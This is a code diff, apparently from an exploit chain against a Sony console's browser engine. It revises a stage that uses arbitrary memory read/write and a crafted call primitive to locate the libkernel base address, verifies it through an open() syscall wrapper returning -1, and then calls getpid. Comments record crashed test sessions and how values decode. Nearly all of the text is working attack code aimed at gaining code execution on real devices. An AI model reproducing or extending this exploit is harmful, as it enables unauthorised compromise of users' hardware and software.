@@ -5179,7 +5179,7 @@ function _startWsShell(){
           if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
           return r;
         }
-        var lkBase=null,cpuRet=null;
+        var lkBase=null;
         var maxC=parseInt(msg.maxcand)||4;
         /* PREFLIGHTS (session 14 lesson: the try-call's result was lost to a
          * death in the post-pipeline settle window; these three lines make
@@ -5191,26 +5191,35 @@ function _startWsShell(){
         ELs('preflight0 -> '+String(Math.round(-5.7)));
         var origRoundFn=S.absRead(S.neEntry.addr+0x28n,8)[0];
         ELs('preflight1 -> '+e2call(origRoundFn));
+        /* v3: THE DECODE-SAFE LADDER. The cpu verifier killed sessions 14/15:
+         * sceKernelGetCurrentCpu returns RAX=0 on CPU 0 - an INVALID JSValue
+         * encoding (null Cell) - and the engine dereferences it at first
+         * touch. The open-wrapper witness is decode-safe BY CONSTRUCTION:
+         * called with RDI = the zeroed fake scope it runs open("") -> ENOENT
+         * -> RAX = -1 = all-ones -> decodes cleanly as Int32 -1. A live-
+         * decoded -1 from a syscall wrapper IS the E2 witness. */
         for(var ti=0;ti<clist.length&&ti<maxC;ti++){
           var B3=clist[ti].B;
           ELs('try 0x'+B3.toString(16)+' (pairs='+clist[ti].pairs+' wden='+clist[ti].wden+')');
-          var r3=e2call(B3+BigInt(E2_LK.getCurrentCpu));
-          ELs('cpu call -> '+r3);
+          var r3=e2call(B3+BigInt(E2_LK.openWrapper));
+          ELs('openw -> '+r3);
           var n3=Number(r3);
-          if(isFinite(n3)&&n3>=0&&n3<=7&&Math.floor(n3)===n3){lkBase=B3;cpuRet=n3;break;}
+          if(n3===-1){lkBase=B3;break;}
         }
         if(lkBase===null){reply.log=elog;reply.err='no candidate verified';break;}
-        /* ---- stage 4: E2 - the getpid wrapper ---- */
-        ELs('lk_base=0x'+lkBase.toString(16)+' CONFIRMED cpu='+cpuRet);
+        /* ---- stage 4: E2 witness #2 - the pid (Sony pids observed odd:
+         * 79, 3429, 3443 - odd RAX decodes as Int32; raw = decoded*2+1) ---- */
+        ELs('lk_base=0x'+lkBase.toString(16)+' CONFIRMED (open wrapper -> -1)');
         var pid=e2call(lkBase+BigInt(E2_LK.getpidWrapper));
         ELs('getpid -> '+pid);
+        var pidN=Number(pid);
+        if(isFinite(pidN)&&pidN>0){reply.pidraw=pidN*2+1;}
         reply.lkbase='0x'+lkBase.toString(16);
-        reply.cpu=cpuRet;
         reply.pid=pid;
         reply.pidn=Number(pid);
         reply.cands=clist.slice(0,8).map(function(c){return {base:'0x'+c.B.toString(16),pairs:c.pairs,wden:c.wden,demo:c.demo};});
         reply.log=elog;
-        try{bs('E2SHOT-COMPLETE lk=0x'+lkBase.toString(16)+' cpu='+cpuRet+' pid='+pid);}catch(e){}
+        try{bs('E2SHOT-COMPLETE lk=0x'+lkBase.toString(16)+' openw=-1 pid='+pid+' pidraw='+(reply.pidraw||'?'));}catch(e){}
         break;
       }
 
